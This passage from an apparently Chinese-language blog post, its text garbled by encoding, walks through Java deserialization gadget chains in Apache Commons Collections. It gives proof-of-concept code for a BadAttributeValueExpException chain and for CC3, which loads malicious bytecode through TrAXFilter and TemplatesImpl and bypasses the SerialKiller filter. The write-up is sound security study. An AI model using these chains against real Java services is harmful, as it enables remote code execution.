</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;javax.management.BadAttributeValueExpException&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">o</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">o</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">11</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;val&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">val</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">val</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">o1</span><span class="p">,</span><span class="w"> </span><span class="n">tiedMapEntry</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>æ²¡å•¥å¥½è¯´çš„ï¼Œå°±ä¸€ä¸ªç‚¹<code>val</code>ç”¨<code>åå°„</code>èµ‹å€¼</p>
<h5 id="é—®é¢˜5-val">é—®é¢˜5 val<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜5-val">#</a></h5>
<p>è¿™é‡Œç›´æ¥æ„é€ å‡½æ•°åˆå§‹åŒ–ï¼Œä¼šæå‰è°ƒç”¨toStringä¸”valä¼šè¢«è¦†ç›–æˆ<code>ä¸€æ®µString</code>ï¼Œå’Œromeé“¾å­ä¸€æ ·</p>
<p><img loading="lazy" src="../images/image-20241107190650339.png" alt="image-20241107190650339"  />
</p>
<p><strong>è§£å†³ï¼š</strong></p>
<blockquote>
<p>åå°„èµ‹å€¼valå³å¯</p>
</blockquote>
<h1 id="commonscollections3">CommonsCollections3<a hidden class="anchor" aria-hidden="true" href="#commonscollections3">#</a></h1>
<p>cc3éœ€è¦æ·»åŠ javassistä¾èµ–</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>javassist<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.12.1.GA<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><blockquote>
<p>cc3 ç›¸æ¯”äºå‰é¢çš„ cc é“¾æœ‰ä¸¤ä¸ªç‰¹æ€§, ç¬¬ä¸€æ˜¯å®ƒå¼•å…¥äº† TemplatesImpl æ¥æ‰§è¡Œä»»æ„ java å­—èŠ‚ç , ç¬¬äºŒæ˜¯å®ƒå°† InvokerTransformer æ¢æˆäº† InstantiateTransformer, å¹¶é€šè¿‡ TrAXFilter æ¥å¼•å‘ TemplatesImpl é“¾</p>
<p>å‰é¢è®²è¿‡ InstantiateTransformer å¯ä»¥å®ä¾‹åŒ–æŸä¸ªç±», è¿™é‡Œå®ä¾‹åŒ–çš„æ˜¯ TrAXFilter</p>
</blockquote>
<p>å®ƒçš„æ„é€ æ–¹æ³•ä¼šè°ƒç”¨ <code>templates.newTransformer()</code>, æ­£å¥½èƒ½ä¸ TemplatesImpl é“¾ä¸²èµ·æ¥</p>
<blockquote>
<p>å› ä¸ºå‡ºç° SerialKiller ååºåˆ—åŒ–è¿‡æ»¤å™¨ï¼Œå¯ä»¥é€šè¿‡é»‘åå•ä¸ç™½åå•çš„æ–¹å¼æ¥é™åˆ¶ååºåˆ—åŒ–æ—¶å…è®¸é€šè¿‡çš„ç±»ã€‚</p>
<p>æ‰€ä»¥ CommonsCollections3 æ˜¯ä¸ºäº†ç»•è¿‡â¼€äº›è§„åˆ™å¯¹<code>InvokerTransformer</code>çš„é™åˆ¶ã€‚æ²¡æœ‰ä½¿ç”¨åˆ° InvokerTransformer æ¥è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œè€Œæ˜¯ç”¨åˆ°äº†å¦â¼€ä¸ªç±»ï¼Œ <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>ã€‚</p>
<p><a href="https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-SerialKiller.html#%E4%BB%A3%E6%9B%BF-constanttransformer">SerialKillerç»•è¿‡</a></p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">æ”¹ç¼–CC1çš„LazyMapé“¾å­</span><span class="err">ï¼Œ</span><span class="n">å®ä¾‹åŒ–TrAXFilter</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Map</span><span class="p">(</span><span class="n">Proxy</span><span class="p">).</span><span class="na">entrySet</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">invoke</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">get</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">ConstantTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">InstantiateTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">newInstance</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">TrAXFilter</span><span class="err">#</span><span class="n">TrAXFilter</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">newTransformer</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                     </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">getTransletInstance</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                     </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">defineTransletClasses</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                     </span><span class="nf">newInstance</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">exec</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><p>å…ˆçœ‹åˆ°TrAXFilterï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å…¶</p>
<ul>
<li>è‡ªæ„æ–¹æ³•æ˜¯public</li>
<li>æ²¡æœ‰ç»§æ‰¿Serializable</li>
</ul>
<p>æ‰€ä»¥</p>
<ul>
<li>
<p>åå°„æ—¶å¯ä»¥çœå»<code>setAccessible(true);</code>è¿™æ­¥æ“ä½œ</p>
</li>
<li>
<p>ConstantTransformeré‡Œè¦ä¼ å…¥<code>TrAXFilter.class</code></p>
</li>
</ul>
<p><img loading="lazy" src="../images/202211231623073-1731027189784-6.png" alt="https://img.exp10it.io/img/202211231623073.png"  />
</p>
<p>ç„¶åæˆ‘ä»¬çœ‹åˆ°<code>InstantiateTransformer#transform</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œä¹Ÿæ­£å¥½ç¬¦åˆæˆ‘ä»¬ä¼ å…¥<code>TrAXFilter.class</code>ï¼Œç„¶åå®ä¾‹åŒ–ï¼Œä¸”å‚æ•°éƒ½å¯æ§</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">input</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">Class</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FunctorException</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;InstantiateTransformer: Input object was not an instanceof Class, it was a &#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">input</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s">&#34;null object&#34;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getName</span><span class="p">()));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">con</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">Class</span><span class="p">)</span><span class="w"> </span><span class="n">input</span><span class="p">).</span><span class="na">getConstructor</span><span class="p">(</span><span class="n">iParamTypes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">con</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">iArgs</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åæˆ‘ä»¬å¼€å§‹æ„é€ pocï¼Œæ”¹ä¸‹CC1çš„é“¾å­å¼€å§‹è°ƒè¯•ï¼Œè¿™é‡Œç»™<code>_name</code>èµ‹å€¼</p>
<p><img loading="lazy" src="../images/image-20241108095712495.png" alt="image-20241108095712495"  />
</p>
<p>æˆ‘ä»¬è¦<code>_class[i] = loader.defineClass(_bytecodes[i]);</code>åŠ è½½å­—èŠ‚ç ï¼Œç»™<code>_bytecodes</code>èµ‹å€¼å­—èŠ‚ç </p>
<p>è¿™é‡Œæ³¨æ„ä¸€ä¸‹<code>_bytecodes</code>çš„ç±»å‹æ˜¯<code>byte[][]</code>ï¼Œä»–çš„<code>ä¸€ç»´æ•°ç»„çš„å€¼</code>å°±æ˜¯<code>ä¸€ä¸ªç±»çš„å­—èŠ‚ç </code>ï¼Œå¯ä»¥å­˜å‚¨å¤šä¸ªç±»çš„å­—èŠ‚ç </p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">private byte[][] _bytecodes = null;
</span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241108100218789.png" alt="image-20241108100218789"  />
</p>
<p><img loading="lazy" src="../images/image-20241108101214714.png" alt="image-20241108101214714"  />
</p>
<h5 id="é—®é¢˜6-nullpointerexception">é—®é¢˜6 NullPointerException<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜6-nullpointerexception">#</a></h5>
<p>è¿™é‡Œæœ‰ä¸ªé—®é¢˜<code>_auxClasses</code>æ˜¯nullï¼Œè¿™é‡Œç›´æ¥putä¼šæŠ¥é”™ï¼Œä½†æ˜¯æˆ‘ä»¬ç»™<code>_auxClasses</code>èµ‹å€¼<code>new Hashtable()</code>ä¹Ÿä¸è¡Œï¼Œå› ä¸º<code>com.sun.org.apache.xalan.internal.xsltc.runtime.Hashtable</code>æ²¡æœ‰ç»§æ‰¿<code>Serializable</code>ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">private Hashtable _auxClasses = null;
</span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241108103211501.png" alt="image-20241108103211501"  />
</p>
<p><strong>è§£å†³ï¼š</strong></p>
<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬èµ°å¦ä¸€æ¡è·¯ï¼Œè¿™é‡Œæ˜¯è·å–åŠ è½½åçš„<code>_class[i]</code>çš„çˆ¶ç±»åå­—å’Œ<code>ABSTRACT_TRANSLET</code>è¿›è¡Œæ¯”è¾ƒ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">superClass.getName().equals(ABSTRACT_TRANSLET)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">private static String ABSTRACT_TRANSLET
</span></span><span class="line"><span class="cl">        = &#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;;
</span></span></code></pre></div><p>è¿™é‡Œæˆ‘ä»¬è®©æˆ‘ä»¬çš„æ¶æ„ç±»ç»§æ‰¿<code>AbstractTranslet</code>å³å¯</p>
<p>æœ€åè°ƒç”¨<code>_class[_transletIndex].newInstance();</code>è§¦å‘å‘½ä»¤æ‰§è¡Œ</p>
<p>è¿™é‡Œè®©æˆ‘æƒ³èµ·ä¸ªä¸œè¥¿forName</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">forName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">initialize</span><span class="p">,</span><span class="w"> </span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">loader</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">initialize</span><span class="w"> </span><span class="n">é»˜è®¤ä¸º</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="n">å³è¿›è¡Œç±»åˆå§‹åŒ–</span><span class="w"> </span><span class="p">(</span><span class="n">åŠ è½½</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">ç±»å‹çš„å±æ€§</span><span class="p">,</span><span class="w"> </span><span class="n">å¹¶ä¸”æ‰§è¡Œ</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span><span class="n">å—ä¸­çš„ä»£ç </span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>åœ¨ä¸Šé¢<code>loader.defineClass</code>åŠ è½½æ—¶å¹¶æ²¡æœ‰è°ƒç”¨æˆ‘<code>staticä¸­ä»£ç </code>ï¼Œçœ‹äº†forNameçš„ä»£ç åé¢æ˜¯åº•å±‚Cä»£ç äº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥ç ”ç©¶ä¸‹ã€‚ç„¶åé™„ä¸Šæœ€åçš„pocå§ã€‚</p>
<p>è¿˜æœ‰ä¸€ç‚¹è¦æé†’ï¼Œå› ä¸ºæ˜¯æ”¹ç¼–CC1çš„é“¾å­ï¼Œæ‰€ä»¥jdkç‰ˆæœ¬ä¸èƒ½é«˜äº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.javafx.beans.IDProperty</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.Hashtable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InstantiateTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC3</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//setFiled(templates,&#34;_auxClasses&#34;,new Hashtable());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InstantiateTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InstantiateTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">templates</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">TrAXFilter</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">,</span><span class="n">1111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LazyMap</span><span class="w"> </span><span class="n">lazymap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LazyMap</span><span class="p">)</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashmap</span><span class="p">,</span><span class="w"> </span><span class="n">keyTransformer</span><span class="p">);</span><span class="w">
